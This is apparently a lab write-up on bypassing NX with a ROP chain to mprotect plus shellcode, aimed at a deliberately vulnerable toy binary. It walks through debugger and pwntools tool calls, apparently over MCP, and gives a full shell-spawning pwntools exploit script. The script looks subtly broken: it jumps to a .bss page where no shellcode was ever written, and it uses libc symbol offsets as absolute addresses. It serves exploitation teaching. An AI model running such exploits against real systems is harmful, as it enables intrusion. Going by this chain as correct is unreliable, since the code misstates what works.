# NX Bypass — ROP to mprotect + Shellcode

When the stack is non-executable (NX enabled), direct shellcode injection
doesn't work. This challenge demonstrates bypassing NX by using a ROP chain
to call `mprotect()` and mark a writable region as executable, then jump to
shellcode placed there.

## The Binary

```c
void vuln() {
    char buf[64];
    read(0, buf, 512);  // overflow
}
int main() { vuln(); return 0; }
```

Compiled with: `gcc -g -O0 -fno-stack-protector -no-pie -o nx-bypass nx-bypass.c`

Note: ASLR disabled for demo. In a real scenario, you'd need a libc leak.

## Walkthrough

### 1. Load and check protections

```
edb_load_program(path="/tmp/nx-bypass")
edb_get_protected_memory_regions()
```

Confirm the stack has `RW` but no `X` permission.

### 2. Find overflow offset

```
pwntools_cyclic(length=256)
```

Run, crash, find offset:

```
pwntools_cyclic_find(value="<crashed_value>")
```

Offset: 72 bytes to return address.

### 3. Find gadgets and addresses

```
edb_list_symbols()
edb_find_rop_gadgets()
```

Look for `pop rdi; ret`, `pop rsi; ret`, `pop rdx; ret`.

Or use pwntools:

```
pwntools_rop(gadgets=["pop rdi", "pop rsi", "pop rdx", "ret"])
```

### 4. Find writable memory

```
edb_get_protected_memory_regions()
```

Look for a `RW` region (e.g., `.bss` at `0x601000`).

### 5. Build the ROP chain

```
# Step 1: mprotect(0x601000, 0x1000, 7)
# Step 2: jmp 0x601000 (where shellcode is placed)
```

Generate shellcode:

```
pwntools_shellcraft(type="sh", arch="amd64")
pwntools_asm(assembly="<shellcode>", arch="amd64")
```

### 6. Set breakpoint and verify

```
edb_set_breakpoint(location="vuln")
edb_run()
edb_get_stack(count=32)
```

The stack should show the ROP chain starting at `$rsp`.

### 7. Single-step through the chain

```
edb_step_instruction(count=5)
edb_get_registers()
```

Verify that `rdi` gets set to the page address, `rsi` to `0x1000`, etc.

### 8. Continue to get shell

```
edb_continue()
```

## Exploit Script

```python
from pwn import *

context.arch = "amd64"
elf = ELF("/tmp/nx-bypass")
rop = ROP(elf)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
ret = rop.find_gadget(["ret"]).address
mprotect = libc.symbols["mprotect"]
shellcode = asm(shellcraft.sh())

page = 0x601000
payload = b"A" * 72
payload += p64(pop_rdi) + p64(page)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect)
payload += p64(page + 128)
payload += shellcode

p = process("/tmp/nx-bypass")
p.send(payload)
p.interactive()
```

## MCP Tools Used

| Tool | Purpose |
|------|---------|
| `edb_get_protected_memory_regions` | Check NX status and find RW page |
| `edb_find_rop_gadgets` | Search for pop rdi/rsi/rdx gadgets |
| `edb_list_symbols` | Find mprotect address in libc |
| `pwntools_shellcraft` | Generate execve shellcode |
| `pwntools_asm` | Assemble shellcode bytes |
| `pwntools_rop` | Find gadgets via pwntools |
| `pwntools_cyclic` / `pwntools_cyclic_find` | Find overflow offset |
| `edb_get_stack` | Verify ROP chain on the stack |
| `edb_step_instruction` | Walk through the chain gadget by gadget |
| `edb_get_registers` | Verify gadget register effects |
